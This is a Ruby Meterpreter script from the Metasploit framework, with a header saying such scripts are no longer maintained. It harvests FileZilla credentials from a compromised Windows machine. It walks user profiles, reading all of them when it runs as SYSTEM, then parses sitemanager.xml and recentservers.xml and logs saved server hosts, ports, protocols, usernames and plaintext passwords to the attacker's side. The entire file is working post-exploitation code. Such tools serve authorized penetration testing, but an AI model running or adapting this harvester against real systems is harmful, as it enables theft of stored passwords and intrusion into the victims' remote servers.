##
# WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
# If you'd like to improve this script, please try to port it as a post
# module instead. Thank you.
##


require "rexml/document"

#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu." ],
  "-c" => [ false, "Return credentials." ]
)

get_credentials=false

opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    print_line "Meterpreter Script for extracting servers and credentials from Filezilla."
    print_line(opts.usage)
    raise Rex::Script::Completed
  when "-c"
    get_credentials=true
  end
}
### If we get here and have none of our flags true, then we'll just
###   get credentials
if !(get_credentials)
  get_credentials=true
end

#-------------------------------------------------------------------------------
#Set General Variables used in the script
@client = client
os = @client.sys.config.sysinfo['OS']
host = @client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'filezilla', Rex::FileUtils.clean_path(host + filenameinfo) )
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = Rex::FileUtils.clean_path(logs + "/" + host + filenameinfo + ".txt")

#-------------------------------------------------------------------------------
#function for checking of FileZilla profile is present
def check_filezilla(path)
  found = nil
  @client.fs.dir.foreach(path) do |x|
    next if x =~ /^(\.|\.\.)$/
    if x =~ (/FileZilla/)
      ### If we find the path, let's return it
      found = path + x
      return found
    end
  end
  return found
end

#-------------------------------------------------------------------------------

def extract_saved_creds(path,xml_file)
  accounts_xml = ""
  creds = ""
  print_status("Reading #{xml_file} file...")
  ### modified to use pidgin_path, which already has .purple in it
  account_file = @client.fs.file.new(path + "\\#{xml_file}", "rb")
  until account_file.eof?
    accounts_xml << account_file.read
  end
  account_file.close
  doc = (REXML::Document.new accounts_xml).root
  doc.elements.to_a("//Server").each do |e|
    print_status "\tHost: #{e.elements["Host"].text}"
    creds << "Host: #{e.elements["Host"].text}"
    print_status "\tPort: #{e.elements["Port"].text}"
    creds << "Port: #{e.elements["Port"].text}"
    logon_type = e.elements["Logontype"].text
    if logon_type == "0"
      print_status "\tLogon Type: Anonymous"
      creds << "Logon Type: Anonymous"
    elsif logon_type =~ /1|4/
      print_status "\tUser: #{e.elements["User"].text}"
      creds << "User: #{e.elements["User"].text}"
      print_status "\tPassword: #{e.elements["Pass"].text}"
      creds << "Password: #{e.elements["Pass"].text}"
    elsif logon_type =~ /2|3/
      print_status "\tUser: #{e.elements["User"].text}"
      creds << "User: #{e.elements["User"].text}"
    end

    proto = e.elements["Protocol"].text
    if  proto == "0"
      print_status "\tProtocol: FTP"
      creds << "Protocol: FTP"
    elsif proto == "1"
      print_status "\tProtocol: SSH"
      creds << "Protocol: SSH"
    elsif proto == "3"
      print_status "\tProtocol: FTPS"
      creds << "Protocol: FTPS"
    elsif proto == "4"
      print_status "\tProtocol: FTPES"
      creds << "Protocol: FTPES"
    end
    print_status ""
    creds << ""

  end
#
  return creds
end
#-------------------------------------------------------------------------------
#Function to enumerate the users if running as SYSTEM
def enum_users(os)
  users = []

  path4users = ""
  sysdrv = @client.sys.config.getenv('SystemDrive')

  if os =~ /7|Vista|2008/
    path4users = sysdrv + "\\users\\"
    path2purple = "\\AppData\\Roaming\\"
  else
    path4users = sysdrv + "\\Documents and Settings\\"
    path2purple = "\\Application Data\\"
  end

  if is_system?
    print_status("Running as SYSTEM extracting user list..")
    @client.fs.dir.foreach(path4users) do |u|
      userinfo = {}
      next if u =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
      userinfo['username'] = u
      userinfo['userappdata'] = path4users + u + path2purple
      users << userinfo
    end
  else
    userinfo = {}
    uservar = @client.sys.config.getenv('USERNAME')
    userinfo['username'] = uservar
    userinfo['userappdata'] = path4users + uservar + path2purple
    users << userinfo
  end
  return users
end

################## MAIN ##################
if client.platform == 'windows'
  print_status("Running Meterpreter FileZilla Credential harvester script")
  print_status("All services are logged at #{dest}")
  enum_users(os).each do |u|
    print_status("Checking if Filezilla profile is present for user :::#{u['username']}:::...")
    ### Find the path (if it exists) for this user,
    filezilla_path = check_filezilla(u['userappdata'])
    if filezilla_path
      print_status("FileZilla profile found!")
      ### modified to use filezilla_path
      xml_cfg_files = ['sitemanager.xml','recentservers.xml']
      if get_credentials
        xml_cfg_files.each do |xml_cfg_file|
          file_local_write(dest,extract_saved_creds(filezilla_path,xml_cfg_file))
        end
      end

    else
      print_error("Filezilla profile not found!")
    end
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
